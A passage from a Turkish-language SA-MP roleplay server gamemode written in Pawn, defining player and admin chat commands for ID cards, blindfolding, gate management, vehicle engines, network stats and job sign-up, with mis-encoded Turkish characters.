					new text1[20];
					if(PlayerInfo[playerid][pMarried]) { text1 = "Evli"; } else { text1 = "Bekar"; }
					new sext[16];
					if(PlayerInfo[playerid][pSex] == 1) { sext = "Erkek"; } else { sext = "Kadýn"; }
					new age = PlayerInfo[playerid][pAge];
					format(string, sizeof(string), "____________ | Kimlik | _____________",GetPlayerNameEx(playerid));
					SendClientMessage(giveplayerid,-1,string);
					format(string, sizeof(string), "Ýsim/Soyisim: %s",GetPlayerNameEx(playerid));
					SendClientMessage(giveplayerid,-1,string);
					format(string, sizeof(string), "Cinsiyet: %s", sext);
					SendClientMessage(giveplayerid,-1,string);
					format(string, sizeof(string), "Yaþ : %d | Medeni Hali: %s", age, text1);
					SendClientMessage(giveplayerid,-1,string);
					SendClientMessage(giveplayerid,-1,"________________________________");
					format(string,sizeof(string),"%s adlý kiþiye kimlik gösterdiniz.",GetPlayerNameEx(giveplayerid));
					SendClientMessage(playerid, COLOR_WHITE, string);
				}
				else
				{
					SendClientMessage(playerid, COLOR_WHITE, "Kimliðinizi göstereceðiniz kiþiye yakýn olmak zorundasýnýz.");
				}
			}
		}
        else
        {
			SendClientMessage(playerid, COLOR_WHITE, "Geçersiz oyuncu.");
        }
	}
    return 1;
}

CMD:gozbagla(playerid, params[])
{
	new string[128], giveplayerid;
	if(!PlayerInfo[playerid][pBlindfold]) return SendClientMessage(playerid, COLOR_WHITE, "Gozbaglama bandanan yok.");
	if(sscanf(params, "u",  giveplayerid)) return SendClientMessage(playerid, COLOR_WHITE, "{AFAFAF}KULLANIM:{FFFFFF} /gozbagla [Oyuncu ID/Isim]");
	if(!IsPlayerConnected(giveplayerid)) return SendClientMessage(playerid, COLOR_WHITE, "Uygun olmayan oyuncu IDsi.");
	if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_WHITE, "Birilerinin gözünü baðlamak için bir aracýn içinde olmalýsýn.");
	if(GetPlayerVehicleID(playerid) != GetPlayerVehicleID(giveplayerid)) return SendClientMessage(playerid, COLOR_WHITE, "Oyuncu aracýnýzda deðil.");
	if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SendClientMessage(playerid, COLOR_WHITE, "Sürücü koltuðunda deðilsiniz.");
	if(!IsPlayerTied(giveplayerid)) return SendClientMessage(playerid, COLOR_WHITE, "Bu kiþinin elleri baðlý deðil.");
	if(giveplayerid == playerid) return SendClientMessage(playerid, COLOR_WHITE, "Kendi üzerinde kullanamazsýn.");
	Blindfolded[giveplayerid] = 1;
	PlayerInfo[playerid][pBlindfold]--;
	SetPlayerCameraPos(giveplayerid, -833.5241,-1358.8575,86.9054);
	SetPlayerCameraLookAt(giveplayerid, -833.5241,-1358.8575,0);
	GameTextForPlayer(giveplayerid, "~r~Gozlerin baglandi", 2500, 3);
	format(string, sizeof(string), "* %s bir adet göz bandanasý çýkarýr ve %s adlý kiþinin gözlerini baðlar.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
	ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
	SendClientMessage(playerid, COLOR_WHITE, " /gozbagiac yazarak gözü baðlý olan birisinin gözünü açabilirsiniz.");
	return 1;
}

CMD:gozbagiac(playerid, params[])
{
	new string[128], giveplayerid;
	if(sscanf(params, "u",  giveplayerid)) return SendClientMessage(playerid, COLOR_WHITE, "{AFAFAF}KULLANIM:{FFFFFF} /gozbagiac [Oyuncu ID/Isim]");
	if(!IsPlayerConnected(giveplayerid)) return SendClientMessage(playerid, COLOR_WHITE, "Uygun olmayan oyuncu ID'si.");
	if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_WHITE, "Birilerinin gözünü açmak ya da kapatmak için aracýn içinde olmalýsýn.");
	if(GetPlayerVehicleID(playerid) != GetPlayerVehicleID(giveplayerid)) return SendClientMessage(playerid, COLOR_WHITE, "Oyuncu senin aracýnda deðil.");
	if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SendClientMessage(playerid, COLOR_WHITE, "Sürücü koltuðunda deðilsiniz.");
	if(!Blindfolded[giveplayerid]) return SendClientMessage(playerid, COLOR_WHITE, "Bu oyuncunun gözü baðlý deðil");
	if(giveplayerid == playerid && PlayerTied[playerid] == 1) return SendClientMessage(playerid, COLOR_WHITE, "Ellerin baðlýyken kendi gözünü açamazsýn.");
	Blindfolded[giveplayerid] = 0;
	SetCameraBehindPlayer(giveplayerid);
	GameTextForPlayer(giveplayerid, "~G~Gozlerin Acildi", 2500, 3);
	format(string, sizeof(string), "* %s, %s'nin göz bagýný elleriyle çözer.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
	ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
	return 1;
}

CMD:hizlimiti(playerid, params[])
{
	new string[128], speed;
	if(sscanf(params, "i", speed)) return SendClientMessage(playerid, COLOR_WHITE, "{AFAFAF}KULLANIM: {FFFFFF}/hizlimiti [hýz]");
	if(speed < 0) return SendClientMessage(playerid, COLOR_WHITE, "Uygun olmayan Hýz girdiniz.");
	Speedlimit[playerid] = speed;
	if(speed == 0) format(string, sizeof(string), "Aracýn hýz limitini kapattýn.", speed);
    else format(string, sizeof(string), "Hýz limitini %d olarak ayarladýn, artýk bu limiti aþamazsýn.", speed);
    SendClientMessage(playerid, COLOR_WHITE, string);
	return 1;
}

CMD:clearchat(playerid, params[]) {
	return cmd_cc(playerid, params);
}

CMD:cc(playerid, params[])
{
	foreach(Player, i)
	{
		if (PlayerInfo[playerid][pAdmin] >= 1 || PlayerInfo[playerid][pHelper] >= 5)
		{
			for(new e = 0; e < 4; e++) ClearChatbox(i);
		}
	}
	return 1;
}

CMD:respawnall(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 3)
	{
		SetTimerEx("respawn", 8000, false, "i", playerid);
		new string[128];

		if(PlayerInfo[playerid][pAdmin] >= 1)
		{
			format(string, sizeof(string), "(( {FF6347}Level %d Admin %s: {FFFFFF}Kullanýlmayan araçlar 10 saniye içinde respawn edilecektir! ))", PlayerInfo[playerid][pAdmin], GetPlayerNameEx(playerid));
			SendClientMessageToAllEx(COLOR_OOC,string);
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "Bu komutu kullanma yetkiniz yok!");
	}
	return 1;
}

CMD:rc(playerid, params[]) {
	return cmd_respawnall(playerid, params);
}

CMD:gedit(playerid, params[])
{
	new string[128], idx;
	if(!gPlayerLogged[playerid]) return SendClientMessage(playerid, COLOR_WHITE, "Komutlarý kullanmak için önce giriþ yapmanýz gerekmektedir.");
	if(PlayerInfo[playerid][pAdmin] < 7) return SendClientMessage(playerid, COLOR_WHITE, "Bu komutu kullanma yetkiniz yok!");
 	if(sscanf(params, "s[128]", params))
	{
		SendClientMessage(playerid, COLOR_WHITE, "{AFAFAF}KULLANIM:{FFFFFF} /gedit [secenek] [gateid]");
		SendClientMessage(playerid, COLOR_WHITE, "SECENEKLER: object | open | close | speed | password");
		return 1;
	}
	if(!strcmp(params, "object", true, 5))
	{
	    new object;
	    if(sscanf(params, "s[128]ii", params, idx, object)) return SendClientMessage(playerid, COLOR_WHITE, "{AFAFAF}KULLANIM:{FFFFFF} /gedit object [gateid] [obje id]");
        if(!GateInfo[idx][gModel]) return SendClientMessage(playerid, COLOR_WHITE, "Geçersiz gate id.");
        if(object == 0)
		{
			format(string, sizeof(string), "%d", object);
			cmd_deletegate(playerid, string);
			return 1;
		}
		GateInfo[idx][gModel] = object;
		DestroyDynamicObject(GateInfo[idx][gGate]);
		GateInfo[idx][gGate] = CreateDynamicObject(GateInfo[idx][gModel], GateInfo[idx][gCX], GateInfo[idx][gCY], GateInfo[idx][gCZ], GateInfo[idx][gCRX], GateInfo[idx][gCRY], GateInfo[idx][gCRZ]);
	    format(string, sizeof(string), "%d ID'li kapýnýn objesini %d olarak belirledin!", idx, object);
	    SendClientMessage(playerid, COLOR_WHITE, string);
	    SaveGates();
	}
	else if(!strcmp(params, "open", true, 4))
	{
	    if(sscanf(params, "s[128]i", params, idx)) return SendClientMessage(playerid, COLOR_WHITE, "{AFAFAF}KULLANIM:{FFFFFF} /gedit open [gateid]");
        if(!GateInfo[idx][gModel]) return SendClientMessage(playerid, COLOR_WHITE, "Geçersiz gate id.");
		gEdit[playerid] = 1;
		gEditID[playerid] = idx;
		GetDynamicObjectPos(GateInfo[idx][gGate], gPos[playerid][0], gPos[playerid][1], gPos[playerid][2]);
		GetDynamicObjectRot(GateInfo[idx][gGate], gRot[playerid][0], gRot[playerid][1], gRot[playerid][2]);
		EditDynamicObject(playerid, GateInfo[idx][gGate]);
	    format(string, sizeof(string), "%d ID'li kapýnýn açýlma pozisyonunu düzenleyin!", idx);
	    SendClientMessage(playerid, COLOR_WHITE, string);
	    SaveGates();
	}
	else if(!strcmp(params, "close", true, 5))
	{
	    if(sscanf(params, "s[128]i", params, idx)) return SendClientMessage(playerid, COLOR_WHITE, "{AFAFAF}KULLANIM:{FFFFFF} /gedit close [gateid]");
        if(!GateInfo[idx][gModel]) return SendClientMessage(playerid, COLOR_WHITE, "Geçersiz gate id.");
		gEdit[playerid] = 2;
		gEditID[playerid] = idx;
		GetDynamicObjectPos(GateInfo[idx][gGate], gPos[playerid][0], gPos[playerid][1], gPos[playerid][2]);
		GetDynamicObjectRot(GateInfo[idx][gGate], gRot[playerid][0], gRot[playerid][1], gRot[playerid][2]);
		EditDynamicObject(playerid, GateInfo[idx][gGate]);
	    format(string, sizeof(string), "%d ID'li kapýnýn kapanma pozisyonunu düzenleyin!", idx);
	    SendClientMessage(playerid, COLOR_WHITE, string);
	    SaveGates();
	}
	else if(!strcmp(params, "speed", true, 5))
	{
	    new Float:speed;
	    if(sscanf(params, "s[128]if", params, idx, speed)) return SendClientMessage(playerid, COLOR_WHITE, "{AFAFAF}KULLANIM:{FFFFFF} /gedit speed [gateid] [speed]");
        if(!GateInfo[idx][gModel]) return SendClientMessage(playerid, COLOR_WHITE, "Geçersiz gate id.");
		GateInfo[idx][gSpeed] = speed;
	    format(string, sizeof(string), "%d ID'li kapýnýn hýzýný %f olarak ayarladýn!", idx, speed);
	    SendClientMessage(playerid, COLOR_WHITE, string);
	    SaveGates();
	}
	else if(!strcmp(params, "password", true, 8))
	{
	    new password[256];
	    if(sscanf(params, "s[128]is[256]", params, idx, password)) return SendClientMessage(playerid, COLOR_WHITE, "{AFAFAF}KULLANIM:{FFFFFF} /gedit password [gateid] [þifre]");
        if(!GateInfo[idx][gModel]) return SendClientMessage(playerid, COLOR_WHITE, "Geçersiz gate id.");
		format(GateInfo[idx][gPassword], 256, "%s", password);
	    format(string, sizeof(string), "%d ID'li kapýnýn þifresi artýk {38B0DE}%s", idx, password);
	    SendClientMessage(playerid, COLOR_WHITE, string);
	    SaveGates();
	}
	return 1;
}

CMD:gotogate(playerid, params[])
{
    new idx, string[128];
	if(!gPlayerLogged[playerid]) return SendClientMessage(playerid, COLOR_WHITE, "Komutlarý kullanmak için önce giriþ yapmanýz gerekmektedir.");
	if(PlayerInfo[playerid][pAdmin] < 7) return SendClientMessage(playerid, COLOR_WHITE, "Bu komutu kullanma yetkiniz yok!");
	if(sscanf(params, "i", idx)) return SendClientMessage(playerid, COLOR_WHITE, "{AFAFAF}KULLANIM:{FFFFFF} /gotogate [gateid]");
	if(!GateInfo[idx][gModel]) return SendClientMessage(playerid, COLOR_WHITE, "Geçersiz gate!");
	SetPlayerPos(playerid, GateInfo[idx][gCX], GateInfo[idx][gCY], GateInfo[idx][gCZ]);
	format(string, sizeof(string), "Þu gateye teleport oldun! (ID: %d)", idx);
	SendClientMessage(playerid, COLOR_WHITE, string);
	return 1;
}

CMD:gused(playerid, params[])
{
	new string[128];
	if(!gPlayerLogged[playerid]) return SendClientMessage(playerid, COLOR_WHITE, "Komutlarý kullanmak için önce giriþ yapmanýz gerekmektedir.");
	if(PlayerInfo[playerid][pAdmin] < 7) return SendClientMessage(playerid, COLOR_WHITE, "Bu komutu kullanma yetkiniz yok");
	SendClientMessage(playerid, COLOR_ORANGE, "[Gateler]:");
	for(new idx=1; idx<MAX_GATES; idx++)
	{
	    if(GateInfo[idx][gModel])
	    {
			format(string, sizeof(string), "ID: %d | Obje: %d | Hýz: %f | Þifre: %s", idx, GateInfo[idx][gModel], GateInfo[idx][gSpeed], GateInfo[idx][gPassword]);
			SendClientMessage(playerid, COLOR_ORANGE, string);
	    }
	}
	return 1;
}

CMD:gnear(playerid, params[])
{
    if(PlayerInfo[playerid][pAdmin] >= 3)
	{
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 2)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin görevinde deðilsiniz.");
			return 1;
	    }
		SendClientMessageEx(playerid, COLOR_RED, "* 30 metre içerisindeki gateler gösteriliyor.");
		new Float:X, Float:Y, Float:Z;
		new Float:X2, Float:Y2, Float:Z2;
  		GetPlayerPos(playerid, X2, Y2, Z2);
		for(new i;i<MAX_GATES;i++)
		{
			GetDynamicObjectPos(GateInfo[i][gGate], X, Y, Z);
			if(IsPlayerInRangeOfPoint(playerid, 30, X, Y, Z))
			{
				if(GateInfo[i][gModel])
				{
				    new string[128];
			    	format(string, sizeof(string), "Gate ID %d | %f from you", i, GetDistance(X, Y, Z, X2, Y2, Z2));
			    	SendClientMessage(playerid, COLOR_WHITE, string);
				}
			}
		}
	}
	else
	{
	    SendClientMessageEx(playerid, COLOR_GRAD2, "Bu komutu kullanma yetkiniz yok!");
	}
	return 1;
}

CMD:deletegate(playerid, params[])
{
	new idx, string[128];
	if(!gPlayerLogged[playerid]) return SendClientMessage(playerid, COLOR_WHITE, "Komutlarý kullanmak için önce giriþ yapmanýz gerekmektedir.");
	if(PlayerInfo[playerid][pAdmin] < 7) return SendClientMessage(playerid, COLOR_WHITE, "Bu komutu kullanma yetkiniz yok!");
	if(sscanf(params, "i", idx)) return SendClientMessage(playerid, COLOR_WHITE, "{AFAFAF}KULLANIM:{FFFFFF} /deletegate [gateid]");
	if(!GateInfo[idx][gModel]) return SendClientMessage(playerid, COLOR_WHITE, "Geçersiz gate!");
	GateInfo[idx][gModel] = 0;
	GateInfo[idx][gCX] = 0;
	GateInfo[idx][gCY] = 0;
	GateInfo[idx][gCZ] = 0;
	GateInfo[idx][gCRX] = 0;
	GateInfo[idx][gCRY] = 0;
	GateInfo[idx][gCRZ] = 0;
	GateInfo[idx][gOX] = 0;
	GateInfo[idx][gOY] = 0;
	GateInfo[idx][gOZ] = 0;
	GateInfo[idx][gORX] = 0;
	GateInfo[idx][gORY] = 0;
	GateInfo[idx][gORZ] = 0;
	GateInfo[idx][gStatus] = 0;
	format(GateInfo[idx][gPassword], 256, "");
	GateInfo[idx][gSpeed] = 0;
	DestroyDynamicObject(GateInfo[idx][gGate]);
	DestroyDynamic3DTextLabel(GateInfo[idx][gText]);
	format(string, sizeof(string), "{5d478b}UYARI:{FFFFFF} %s adlý admin %d id'li gateyi sildi!", GetPlayerNameEx(playerid), idx);
	SaveGates();
    SendAdminMessage(COLOR_LIGHTRED, 1, string);
	Log("logs/gateler.log", string);
	return 1;
}

CMD:creategate(playerid, params[])
{
	new string[128], object;
   	if(!gPlayerLogged[playerid]) return SendClientMessage(playerid, COLOR_WHITE, "Komutlarý kullanmak için önce giriþ yapmanýz gerekmektedir.");
	if(PlayerInfo[playerid][pAdmin] < 7) return SendClientMessage(playerid, COLOR_WHITE, "Bu komutu kullanma yetkiniz yok!");
	if(sscanf(params, "i", object)) return SendClientMessage(playerid, COLOR_WHITE, "{AFAFAF}KULLANIM:{FFFFFF} /creategate [obje id]");
	for(new idx=1; idx<MAX_GATES; idx++)
	{
	    if(!GateInfo[idx][gModel])
	    {
	        GetPlayerPos(playerid, GateInfo[idx][gCX], GateInfo[idx][gCY], GateInfo[idx][gCZ]);
  			GateInfo[idx][gModel] = object;
			GateInfo[idx][gCX] = GateInfo[idx][gCX] + 2;
			GateInfo[idx][gCY] = GateInfo[idx][gCY] + 2;
			GateInfo[idx][gCRX] = 0;
			GateInfo[idx][gCRY] = 0;
			GateInfo[idx][gCRZ] = 0;
			GetPlayerPos(playerid, GateInfo[idx][gOX], GateInfo[idx][gOY], GateInfo[idx][gOZ]);
			GateInfo[idx][gOX] = GateInfo[idx][gOX] + 2;
			GateInfo[idx][gOY] = GateInfo[idx][gOY] + 2;
			GateInfo[idx][gORX] = 0;
			GateInfo[idx][gORY] = 0;
			GateInfo[idx][gORZ] = 0;
			GateInfo[idx][gStatus] = 0;
			format(GateInfo[idx][gPassword], 256, "");
			GateInfo[idx][gSpeed] = 2;
			// Creating
			format(string, sizeof(string), "Gate ID: %d", idx);
			GateInfo[idx][gGate] = CreateDynamicObject(GateInfo[idx][gModel], GateInfo[idx][gCX], GateInfo[idx][gCY], GateInfo[idx][gCZ], GateInfo[idx][gCRX], GateInfo[idx][gCRY], GateInfo[idx][gCRZ]);
			GateInfo[idx][gText] = CreateDynamic3DTextLabel(string, COLOR_WHITE, GateInfo[idx][gCX], GateInfo[idx][gCY], GateInfo[idx][gCZ], 10);
			// Text
			format(string, sizeof(string), "{5d478b}UYARI:{FFFFFF}%s adlý admin %d id'li gateyi oluþturdu!. (Object: %d)", GetPlayerNameEx(playerid), idx, object);
			SaveGates();
		    SendAdminMessage(COLOR_RED, 1, string);
			Log("logs/gateler.log", string);
			idx = MAX_GATES;
		}
	}
	return 1;
}

CMD:setgate(playerid, params[])
{
	new giveplayerid, slot, idx, string[128];
	if(!gPlayerLogged[playerid]) return SendClientMessage(playerid, COLOR_WHITE, "Komutlarý kullanmak için önce giriþ yapmanýz gerekmektedir.");
	if(PlayerInfo[playerid][pAdmin] < 7) return SendClientMessage(playerid, COLOR_WHITE, "Bu komutu kullanma yetkiniz yok!");
	if(sscanf(params, "uii", playerid, slot, idx)) return SendClientMessage(playerid, COLOR_WHITE, "{AFAFAF}KULLANIM:{FFFFFF} /setgate [playerid] [slot(1-3)] [gateid]");
	if(!gPlayerLogged[playerid]) return SendClientMessage(playerid, COLOR_WHITE, "Uygun olmayan oyuncu IDsi.");
	if(idx > 0 && !GateInfo[idx][gModel] || idx < 0) return SendClientMessage(playerid, COLOR_WHITE, "Geçersiz gate ID!");
	if(slot < 1 || slot > 3) return SendClientMessage(playerid, COLOR_WHITE, "Gate slotlarý 1 ve 3 arasýndadýr.");
	switch(slot)
	{
	    case 1: PlayerInfo[playerid][pGate1] = idx;
	    case 2: PlayerInfo[playerid][pGate2] = idx;
	    case 3: PlayerInfo[playerid][pGate3] = idx;
	}
	if(idx == 0)
	{
		format(string, sizeof(string), "%s adlý admin %d'deki gateni sildi!", GetPlayerNameEx(giveplayerid), slot);
		SendClientMessage(playerid, COLOR_WHITE, string);
		format(string, sizeof(string), "{5d478b}UYARI:{FFFFFF} %s adlý admin %s'nin %d'deki gatesini sildi!", GetPlayerNameEx(giveplayerid), GetPlayerNameEx(playerid), slot);
		SendAdminMessage(COLOR_LIGHTRED, 1, string);
		Log("logs/gateler.log", string);
	}
	else
	{
		format(string, sizeof(string), "%s adlý admin seni %d ID'li gatenin sahibi yaptý!", GetPlayerNameEx(giveplayerid), idx, slot);
		SendClientMessage(playerid, COLOR_WHITE, string);
		format(string, sizeof(string), "{5d478b}UYARI:{FFFFFF} %s kapýnýn sahibini %s yaptý! ID %d. (Slot %d)", GetPlayerNameEx(giveplayerid), GetPlayerNameEx(playerid), idx, slot);
		SaveGates();
		SendAdminMessage(COLOR_LIGHTRED, 1, string);
		Log("logs/gateler.log", string);
	}
	return 1;
}

CMD:gateyardim(playerid, params[])
{
   	if(!gPlayerLogged[playerid]) return SendClientMessage(playerid, COLOR_WHITE, "Komutlarý kullanmak için önce giriþ yapmanýz gerekmektedir.");
    SendClientMessage(playerid, COLOR_YELLOW, "GATE YARDIM: {FFFFFF}/gate /gatesifredegistir");
	return 1;
}

CMD:gatesifredegistir(playerid, params[])
{
	new String[128], Slot, Password[256], Idx;
   	if(!gPlayerLogged[playerid]) return SendClientMessage(playerid, COLOR_WHITE, "Komutlarý kullanmak için önce giriþ yapmanýz gerekmektedir.");
	if(sscanf(params, "is[256]", Slot, Password)) return SendClientMessage(playerid, COLOR_WHITE, "{AFAFAF}KULLANIM:{FFFFFF} /gatesifredegistir [slot] [þifre]");
	if(Slot < 1 || Slot > 3) return SendClientMessage(playerid, COLOR_WHITE, "Gate slotu 1 ile 3 arasýndadýr.");
	if(strcmp(Password,"0") == 0) return SendClientMessage(playerid,COLOR_RED,"(( Gate þifreleri için yasaklý rakam girdiniz. ))");
	switch(Slot)
	{
		case 1: Idx = PlayerInfo[playerid][pGate1];
		case 2: Idx = PlayerInfo[playerid][pGate2];
		case 3: Idx = PlayerInfo[playerid][pGate3];
	}
	if(!Idx) return SendClientMessage(playerid, COLOR_WHITE, "Bu slotta kayýtlý gateniz bulunmamaktadýr.");
	format(GateInfo[Idx][gPassword], 256, "%s", Password);
 	format(String, sizeof(String), "Slotu %d (ID: %d) olan gatenin parolasýný {38B0DE}%s yaptýnýz", Slot, Idx, Password);
 	SaveGates();
	SendClientMessage(playerid, COLOR_WHITE, String);
	return 1;
}

CMD:amotor(playerid, params[]) {
	new vehicleid = GetPlayerVehicleID(playerid), string[128];
	if(GetVehicleModel(vehicleid) == 481 || GetVehicleModel(vehicleid) == 509 || GetVehicleModel(vehicleid) == 510) return 1;
	if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_WHITE, "Araçta deðilsiniz.");
	if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SendClientMessage(playerid, COLOR_WHITE, "Bu aracýn þoförü deðilsiniz!");
	GetVehicleParamsEx(vehicleid, engine, lights, alarm, doors, bonnet, boot, objective);
	if(IsRentableCar(vehicleid) && !IsRentedCar(vehicleid)) return RemovePlayerFromVehicle(playerid);
	if(engine == VEHICLE_PARAMS_OFF || engine == VEHICLE_PARAMS_UNSET) {
	    if(Fuel[vehicleid] <= 0.0) return SendClientMessageEx(playerid, COLOR_WHITE, "Bu aracýn benzini bitmiþ, çalýþtýramazsýnýz!");
	    SetVehicleParamsEx(vehicleid, true, lights, alarm, doors, bonnet, boot, objective);
        format(string, sizeof string, "** %s aracýn anahtarýný kontaða sokar ve çevirerek motoru çalýþtýrýr", GetPlayerNameEx(playerid));
		engine = 1;
 		SetPVarInt(playerid, "fuelonoff", 1);
	 	FuelBar[playerid] = CreateProgressBar( 374, 404, 113.0, 6.2, 866792447, 100.0);
	  	SetProgressBarValue(FuelBar[playerid], Fuel[vehicleid]);
		ShowProgressBarForPlayer(playerid, FuelBar[playerid]);
	}
	else {
	    SetVehicleParamsEx(vehicleid, false, lights, alarm, doors, bonnet, boot, objective);
	    format(string, sizeof string, "** %s aracýn anahtarýný çevirerek motoru durdurur.", GetPlayerNameEx(playerid));
	    engine = 0;
		SetPVarInt(playerid, "fuelonoff", 0);
  		HideProgressBarForPlayer(playerid, FuelBar[playerid]);
		DestroyProgressBar(FuelBar[playerid]);
		FuelBar[playerid] = INVALID_BAR_ID;
	}
	ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
	return 1;
}


CMD:karakterim(playerid, params[]){
	if(Showing[playerid] == 1)
	{
      	OcultarCuenta(playerid);
	}
	else
	{
		Showing[playerid] = 1;
		TextDrawShowForPlayer(playerid, CuentaBox);
	    TextDrawShowForPlayer(playerid, CuentaLogo);
	    TextDrawShowForPlayer(playerid, CuentaGeneral);
	    TextDrawShowForPlayer(playerid, CuentaInmuebles);
	    TextDrawShowForPlayer(playerid, CuentaAutos);
	    TextDrawShowForPlayer(playerid, CuentaInventario);
	    TextDrawShowForPlayer(playerid, CuentaCerrar);
	    SelectTextDraw(playerid, 0xFFC617FF);
	}
	return 1;
}

CMD:benzingostergesi(playerid, params[])
{
  	HideProgressBarForPlayer(playerid, FuelBar[playerid]);
	DestroyProgressBar(FuelBar[playerid]);
	FuelBar[playerid] = INVALID_BAR_ID;
}
CMD:netstats(playerid, params[]) {
	if(gPlayerLogged[playerid] != 0) {
		new strStats[401], szTitle[64];
		GetPlayerNetworkStats(playerid, strStats, sizeof(strStats));
		format(szTitle, sizeof(szTitle), "Network Stats (ID: %d) - %s", playerid, GetPlayerNameEx(playerid));
		ShowPlayerDialogEx(playerid, 0, DIALOG_STYLE_MSGBOX, szTitle, strStats, "Kapat", "");
	}
	return 1;
}

CMD:anetstats(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 2) {
		SendClientMessage(playerid, COLOR_GRAD1, "Bu komutu kullanma yetkiniz yok!");
		return 1;
	}
 	if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
  	{
   		SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsiniz. Admin komutlarýna eriþmek için iþbaþý yapmanýz gerekir. Ýþbaþý yapmak için /aduty komutunu kullanýn.");
		return 1;
	}

	new giveplayerid, strStats[401], szTitle[64];
	if(sscanf(params, "u", giveplayerid)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /anetstats [Oyuncu ID/Ýsim]");

	if(gPlayerLogged[giveplayerid] != 0) {
		GetPlayerNetworkStats(giveplayerid, strStats, sizeof(strStats));
		format(szTitle, sizeof(szTitle), "Network Stats (ID: %d) - %s", giveplayerid, GetPlayerNameEx(giveplayerid));
		ShowPlayerDialogEx(playerid, 0, DIALOG_STYLE_MSGBOX, szTitle, strStats, "Kapat", "");
	}
	return 1;
}

CMD:isegir(playerid, params[])
{
    if(PlayerInfo[playerid][pJob] == 0)
	{
    	if(PlayerInfo[playerid][pJob] == 0 && GetPlayerState(playerid) == 1 && IsPlayerInRangeOfPoint(playerid,3.0, 241.0634, 112.8905, 1003.2188))
		{
 			SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Dedektif olmak istiyorsanýz, /kabulet meslek yazýn.");
   			GettingJob[playerid] = 1;
     		return 1;
 		}
   		else if(PlayerInfo[playerid][pJob] == 0 && GetPlayerState(playerid) == 1 && IsPlayerInRangeOfPoint(playerid,3.0,1380.8955,-1088.6808,27.3844))
   		{
     		SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Avukat olmak istiyorsanýz, /kabulet meslek yazýn.");
       		GettingJob[playerid] = 2;
         	return 1;
     	}
		else if(PlayerInfo[playerid][pJob] == 0 && GetPlayerState(playerid) == 1 && IsPlayerInRangeOfPoint(playerid,3.0,1215.1304,-11.8431,1000.9219))
	 	{
   			SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Hayat Kadýný olmak istiyorsanýz, /kabulet meslek yazýn.");
      		GettingJob[playerid] = 3;
        	return 1;
   		}
  		else if(PlayerInfo[playerid][pJob] == 0 && GetPlayerState(playerid) == 1 && IsPlayerInRangeOfPoint(playerid,3.0,2166.3772,-1675.3829,15.0859))
   		{
     		SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Uyuþturucu Satýcýsý olmak istiyorsanýz, /kabulet meslek yazýn.");
       		GettingJob[playerid] = 4;
         	return 1;
     	}
      	else if(PlayerInfo[playerid][pJob] == 0 && GetPlayerState(playerid) == 1 && IsPlayerInRangeOfPoint(playerid,3.0,1907.39, -1874.70, 13.53))
		  {
       		SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Tamirci olmak istiyorsanýz, /kabulet meslek yazýn.");
         	GettingJob[playerid] = 7;
          	return 1;
      	}
      	else if(PlayerInfo[playerid][pJob] == 0 && GetPlayerState(playerid) == 1 && IsPlayerInRangeOfPoint(playerid,3.0,2226.1716,-1718.1792,13.5165))
	  	{ // Ganton Gym
    		SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Bodyguard olmak istiyorsanýz, /kabulet meslek yazýn.");
      		GettingJob[playerid] = 8;
        	return 1;
      	}
       	else if(PlayerInfo[playerid][pJob] == 0 && GetPlayerState(playerid) == 1 && IsPlayerInRangeOfPoint(playerid,3.0,1099.73,-1504.67,15.800))
	   	{ // All Saints Mall
    		SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Bodyguard olmak istiyorsanýz, /kabulet meslek yazýn.");
      		GettingJob[playerid] = 8;
        	return 1;
       	}
        else if(PlayerInfo[playerid][pJob] == 0 && GetPlayerState(playerid) == 1 && IsPlayerInRangeOfPoint(playerid,3.0,1366.4325,-1275.2096,13.5469))
		{ // Big Ammunation
  			SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Silah Satýcýsý olmak istiyorsanýz, /kabulet meslek yazýn.");
     		GettingJob[playerid] = 9;
       		return 1;
        }
        else if(PlayerInfo[playerid][pJob] == 0 && GetPlayerState(playerid) == 1 && IsPlayerInRangeOfPoint(playerid,3.0,766.0804,14.5133,1000.7004))
		{
  			SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Boksör olmak istiyorsanýz, /kabulet meslek yazýn.");
     		GettingJob[playerid] = 12;
       		return 1;
        }
        else if(PlayerInfo[playerid][pJob] == 0 && GetPlayerState(playerid) == 1 && IsPlayerInRangeOfPoint(playerid,3.0,758.98, -60.32, 1000.78))
		{
  			SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Boksör olmak istiyorsanýz, /kabulet meslek yazýn.");
     		GettingJob[playerid] = 12;
       		return 1;
  		}
     	else if(PlayerInfo[playerid][pJob] == 0 && GetPlayerState(playerid) == 1 && IsPlayerInRangeOfPoint(playerid,3.0,2354.2808,-1169.2959,28.0066))
	 	{
